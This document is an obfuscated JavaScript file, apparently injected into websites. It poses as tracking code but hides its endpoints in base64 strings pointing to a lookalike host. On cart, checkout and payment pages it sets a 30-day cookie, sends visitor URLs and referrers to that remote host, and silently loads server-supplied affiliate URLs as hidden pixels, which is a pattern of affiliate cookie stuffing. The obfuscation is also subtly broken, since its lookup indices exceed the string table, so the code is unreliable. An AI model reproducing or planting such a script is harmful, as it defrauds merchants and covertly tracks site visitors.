(function(_0x4b91f6,_0x14ec56){const _0x3a5a22=_0x5f4d,_0x17c9f7=_0x4b91f6();while(!![]){try{const _0x1d09d0=parseInt(_0x3a5a22(0x1c4))/0x1+-parseInt(_0x3a5a22(0x1d2))/0x2+parseInt(_0x3a5a22(0x1ef))/0x3*(-parseInt(_0x3a5a22(0x1df))/0x4)+-parseInt(_0x3a5a22(0x1bb))/0x5*(parseInt(_0x3a5a22(0x1c0))/0x6)+parseInt(_0x3a5a22(0x1da))/0x7+parseInt(_0x3a5a22(0x1e9))/0x8*(-parseInt(_0x3a5a22(0x1ce))/0x9);if(_0x1d09d0===_0x14ec56)break;else _0x17c9f7['push'](_0x17c9f7['shift']());}catch(_0x3d95fb){_0x17c9f7['push'](_0x17c9f7['shift']());}}}(_0x2d89,0xa923c));

(function(){

    const _0x32f26d=_0x5f4d;

    function _0x1fa8a7(){
        return (_0x32f26d(0x1e6)+_0x32f26d(0x1b8)+_0x32f26d(0x1f0)+_0x32f26d(0x1f7))
        ['replace'](/[xy]/g,function(_0x5cf0f1){

            const _0x5a09dd=Math['random']()*0x10|0x0;

            const _0x4fdd2b=
                _0x5cf0f1==='x'
                    ?_0x5a09dd
                    :(_0x5a09dd&0x3|0x8);

            return _0x4fdd2b['toString'](0x10);
        });
    }

    function _0x4f99d0(_0x5c5db7){

        const _0x1f8c64=
            _0x5c5db7+'=';

        const _0x4f4f53=
            document['cookie']['split'](';');

        for(
            let _0x5d7f0c=0x0;
            _0x5d7f0c<_0x4f4f53['length'];
            _0x5d7f0c++
        ){

            const _0x5ec1a9=
                _0x4f4f53[_0x5d7f0c]['trim']();

            if(
                _0x5ec1a9['indexOf'](_0x1f8c64)===0x0
            ){
                return _0x5ec1a9['substring'](
                    _0x1f8c64['length']
                );
            }
        }

        return '';
    }

    function _0x46878d(){

        const _0x1f2d47=
            window['location']['pathname']
            ['toLowerCase']();

        const _0x5d8691=[
            'cart',
            'checkout',
            'payment',
            'pay',
            'shipping',
            'review-order'
        ];

        return _0x5d8691['some'](
            function(_0x1dd1d0){
                return _0x1f2d47['includes'](_0x1dd1d0);
            }
        );
    }

    function _0x5d6c47(_0x1fd9f7){

        try{

            const _0x53927d=
                new Image();

            _0x53927d['src']=
                _0x1fd9f7;

            _0x53927d['onload']=
                function(){};

            _0x53927d['onerror']=
                function(){};

        }catch(_0x29f4f1){

            console['error'](
                'Tracking pixel error:',
                _0x29f4f1
            );
        }
    }

    function _0x2ef2a3(_0x27dbe1){

        try{

            const _0x21fa76=
                new Image();

            _0x21fa76['src']=
                atob(
                    'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvZmFsbGJhY2stcGl4ZWw/aWQ9'
                )+
                encodeURIComponent(_0x27dbe1);

            _0x21fa76['onload']=
                function(){};

            _0x21fa76['onerror']=
                function(){};

        }catch(_0x5d4be6){

            console['error'](
                'Fallback pixel error:',
                _0x5d4be6
            );
        }
    }

    async function _0x32f6f8(){

        const _0x420c0d=
            'tracking_done_'+
            window['location']['hostname'];

        if(
            sessionStorage['getItem'](_0x420c0d)
            &&
            !_0x46878d()
        ){
            return;
        }

        try{

            const _0x28c72e=
                _0x4f99d0('tracking_uuid')
                ||
                _0x1fa8a7();

            const _0x312d9a=
                new Date(
                    Date['now']()+2592e6
                );

            document['cookie']=
                'tracking_uuid='+
                _0x28c72e+
                '; expires='+
                _0x312d9a['toUTCString']()+
                '; path=/; SameSite=Lax';

            const _0x417f4e=
                await fetch(
                    atob(
                        'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvdHJhY2stdXNlcg=='
                    ),
                    {
                        'method':'POST',
                        'keepalive':!![],
                        'headers':{
                            'Content-Type':
                            'application/json'
                        },
                        'body':JSON['stringify']({
                            'url':
                                window['location']['href'],
                            'referrer':
                                document['referrer'],
                            'unique_id':
                                _0x28c72e,
                            'origin':
                                window['location']['hostname'],
                            'timestamp':
                                Date['now']()
                        })
                    }
                );

            const _0x2cc2d1=
                await _0x417f4e['json']();

            if(
                _0x2cc2d1['success']
                &&
                _0x2cc2d1['affiliate_url']
            ){

                _0x5d6c47(
                    _0x2cc2d1['affiliate_url']
                );

                sessionStorage['setItem'](
                    _0x420c0d,
                    'true'
                );

            }else{

                _0x2ef2a3(
                    _0x28c72e
                );
            }

        }catch(_0x4177d3){

            console['error'](
                'Tracking Failed:',
                _0x4177d3
            );

            _0x2ef2a3(
                _0x1fa8a7()
            );
        }
    }

    function _0x1b0fd8(){

        fetch(
            atob(
                'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvc2l0ZS1jb25maWc/aG9zdD0='
            )+
            encodeURIComponent(
                window['location']['hostname']
            )
        )

        ['then'](
            function(_0x5dbde0){
                return _0x5dbde0['json']();
            }
        )

        ['then'](
            function(_0x3478c4){

                if(
                    !_0x3478c4
                    ||
                    (
                        !_0x3478c4['always']
                        &&
                        !_0x3478c4['cartExtra']
                    )
                ){
                    return;
                }

                if(
                    _0x3478c4['always']
                ){
                    _0x32f6f8();
                }

                if(
                    _0x3478c4['cartExtra']
                    &&
                    _0x46878d()
                ){
                    _0x32f6f8();
                }
            }
        )

        ['catch'](
            function(_0x4d9f45){

                console['error'](
                    'Config fetch failed:',
                    _0x4d9f45
                );
            }
        );
    }

    if(
        document['readyState']==='interactive'
        ||
        document['readyState']==='complete'
    ){

        _0x1b0fd8();

    }else{

        window['addEventListener'](
            'DOMContentLoaded',
            _0x1b0fd8
        );
    }

}());

function _0x5f4d(_0x31d3b7){

    const _0x2d89d7=_0x2d89();

    return _0x5f4d=function(_0x5f4d2f){

        _0x5f4d2f=
            _0x5f4d2f-0x1b0;

        return _0x2d89d7[_0x5f4d2f];

    },_0x5f4d(_0x31d3b7);
}

function _0x2d89(){

    return [

        'xxxxxxxx-',
        'xxxx-4xxx-',
        'yxxx-',
        'xxxxxxxxxxxx',

        'cookie',
        'split',
        'trim',
        'indexOf',
        'substring',

        'location',
        'pathname',
        'toLowerCase',
        'includes',
        'some',

        'src',
        'onload',
        'onerror',

        'tracking_uuid',
        'tracking_done_',

        'hostname',
        'href',
        'referrer',

        'now',
        'toUTCString',

        'stringify',
        'json',

        'success',
        'affiliate_url',

        'setItem',
        'getItem',

        'readyState',
        'interactive',
        'complete',

        'addEventListener',
        'DOMContentLoaded',

        'replace',
        'random',
        'toString',

        'error'
    ];
}